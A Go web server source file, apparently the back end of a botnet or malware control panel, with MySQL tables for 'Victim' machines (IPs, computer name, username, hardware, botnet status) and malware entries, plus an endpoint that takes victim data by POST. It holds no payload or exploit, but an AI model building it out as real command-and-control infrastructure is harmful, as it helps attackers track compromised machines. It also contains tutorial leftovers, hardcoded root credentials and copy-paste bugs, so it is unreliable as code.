package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"text/template"

	_ "github.com/go-sql-driver/mysql"
)

type Malware struct {
	Id            int
	MalwareTypeId int
	Situation     string
}

type Victim struct {
	Id              int
	VictimIp        string
	Victim_local_ip string
	Computer_name   string
	Username        string
	Computer_ram    float32
	Computer_cpu    string
	Computer_status []byte
	Botnet_status   []byte
}

var tmpl = template.Must(template.ParseGlob("form/*"))

func dbConn() (db *sql.DB) {
	dbDriver := "mysql"
	dbUser := "root"
	dbPass := "root"
	dbName := "tester"
	db, err := sql.Open(dbDriver, dbUser+":"+dbPass+"@/"+dbName)
	if err != nil {
		panic(err.Error())
	}
	return db
}
func IndexVictim(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Victim ORDER BY id DESC")
	if err != nil {
		panic(err.Error())
	}
	emp := Victim{}
	res := []Victim{}
	for selDB.Next() {
		var id int
		var victimIp string
		var victimLocalIp string
		var computerName string
		var username string
		var computerRam float32
		var computerCpu string
		var computerStatus []byte
		var botnetStatus []byte
		err = selDB.Scan(&id, &victimIp, &victimLocalIp, &computerName, &username, &computerRam, &computerCpu, &computerStatus, &botnetStatus)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.VictimIp = victimIp
		emp.Victim_local_ip = victimLocalIp
		emp.Computer_name = victimLocalIp
		emp.Username = victimLocalIp
		emp.Computer_ram = computerRam
		emp.Computer_cpu = computerCpu
		emp.Computer_status = computerStatus
		emp.Botnet_status = botnetStatus
		res = append(res, emp)
	}
	_ = tmpl.ExecuteTemplate(w, "IndexVictim", res)
	defer db.Close()
}
func IndexMalware(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC")

	if err != nil {
		panic(err.Error())
	}
	emp := Malware{}
	res := []Malware{}
	for selDB.Next() {
		var Id int
		var MalwareTypeId int
		var Situation string
		err = selDB.Scan(&Id, &MalwareTypeId, &Situation)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = Id
		emp.MalwareTypeId = MalwareTypeId
		emp.Situation = Situation
		res = append(res, emp)
	}
	fmt.Println(res)
	w.Header().Set("Content-Type", "application/json")
	_ = tmpl.ExecuteTemplate(w, "IndexMalwares", res)
	defer db.Close()
}
func ShowMalware(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	nId := r.URL.Query().Get("id")
	selDB, err := db.Query("SELECT * FROM Malware WHERE id=?", nId)
	if err != nil {
		panic(err.Error())
	}
	emp := Malware{}
	for selDB.Next() {
		var id, malwareTypeId int
		var situation string
		err = selDB.Scan(&id, &malwareTypeId, &situation)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.MalwareTypeId = malwareTypeId
		emp.Situation = situation
	}
	tmpl.ExecuteTemplate(w, "ShowMalware", emp)
	defer db.Close()
}
func NewVictim(w http.ResponseWriter, r *http.Request) {
	tmpl.ExecuteTemplate(w, "NewVictim", nil)
}
func InsertVictim(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	if r.Method == "POST" {
		id := r.FormValue("id")
		victimIp := r.FormValue("victimIp")
		victimLocalIp := r.FormValue("victimLocalIp")
		computer_name := r.FormValue("computer_name")
		username := r.FormValue("username")
		computer_ram := r.FormValue("computer_ram")
		computer_cpu := r.FormValue("computer_cpu")
		computer_status := r.FormValue("computer_status")
		botnet_status := r.FormValue("botnet_status")
		fmt.Println(id, victimIp, victimLocalIp, computer_name, username, computer_ram, computer_cpu, computer_status, botnet_status)
		insForm, err := db.Prepare("INSERT INTO Victim(id, victim_ip,victim_local_ip,computer_name,username,computer_ram,computer_cpu,computer_status,botnet_status ) VALUES(?,?,?,?,?,?,?,?,?)")
		if err != nil {
			panic(err.Error())
		}
		insForm.Exec(id, victimIp, victimLocalIp, computer_name, username, computer_ram, computer_cpu, computer_status, botnet_status)
	}
	defer db.Close()
	http.Redirect(w, r, "/Victims", 301)
}

func getJSON(sqlString string) (string, error) {
	db := dbConn()
	rows, err := db.Query(sqlString)
	if err != nil {
		return "", err
	}
	defer rows.Close()
	columns, err := rows.Columns()
	if err != nil {
		return "", err
	}
	count := len(columns)
	tableData := make([]map[string]interface{}, 0)
	values := make([]interface{}, count)
	valuePtrs := make([]interface{}, count)
	for rows.Next() {
		for i := 0; i < count; i++ {
			valuePtrs[i] = &values[i]
		}
		_ = rows.Scan(valuePtrs...)
		entry := make(map[string]interface{})
		for i, col := range columns {
			var v interface{}
			val := values[i]
			b, ok := val.([]byte)
			if ok {
				v = string(b)
			} else {
				v = val
			}
			entry[col] = v
		}
		tableData = append(tableData, entry)
	}
	jsonData, err := json.Marshal(tableData)
	if err != nil {
		return "", err
	}
	fmt.Println(string(jsonData))
	return string(jsonData), nil
}
func getRequested(sqlReq string, w http.ResponseWriter) {
	jsonized, _ := getJSON(sqlReq)
	fmt.Println(jsonized)
	_ = json.NewEncoder(w).Encode(jsonized)

}

//func Edit(w http.ResponseWriter, r *http.Request) {
//	db := dbConn()
//	nId := r.URL.Query().Get("id")
//	selDB, err := db.Query("SELECT * FROM Employee WHERE id=?", nId)
//	if err != nil {
//		panic(err.Error())
//	}
//	emp := Employee{}
//	for selDB.Next() {
//		var id int
//		var name, city string
//		err = selDB.Scan(&id, &name, &city)
//		if err != nil {
//			panic(err.Error())
//		}
//		emp.Id = id
//		emp.Name = name
//		emp.City = city
//	}
//	tmpl.ExecuteTemplate(w, "Edit", emp)
//	defer db.Close()
//}

func Update(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	if r.Method == "POST" {
		name := r.FormValue("name")
		city := r.FormValue("city")
		id := r.FormValue("uid")
		insForm, err := db.Prepare("UPDATE Employee SET name=?, city=? WHERE id=?")
		if err != nil {
			panic(err.Error())
		}
		insForm.Exec(name, city, id)
		log.Println("UPDATE: Name: " + name + " | City: " + city)
	}
	defer db.Close()
	http.Redirect(w, r, "/", 301)
}

func Delete(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	emp := r.URL.Query().Get("id")
	delForm, err := db.Prepare("DELETE FROM Employee WHERE id=?")
	if err != nil {
		panic(err.Error())
	}
	delForm.Exec(emp)
	log.Println("DELETE")
	defer db.Close()
	http.Redirect(w, r, "/", 301)
}

func main() {
	log.Println("Server started on: http://localhost:8080")
	http.HandleFunc("/Malwares", IndexMalware)
	http.HandleFunc("/Victims", IndexVictim)
	http.HandleFunc("/getMalware", ShowMalware)
	http.HandleFunc("/insertVictim", InsertVictim)
	//http.HandleFunc("/edit", Edit)
	http.HandleFunc("/new", NewVictim)
	http.HandleFunc("/update", Update)
	http.HandleFunc("/delete", Delete)
	http.ListenAndServe(":8080", nil)
}
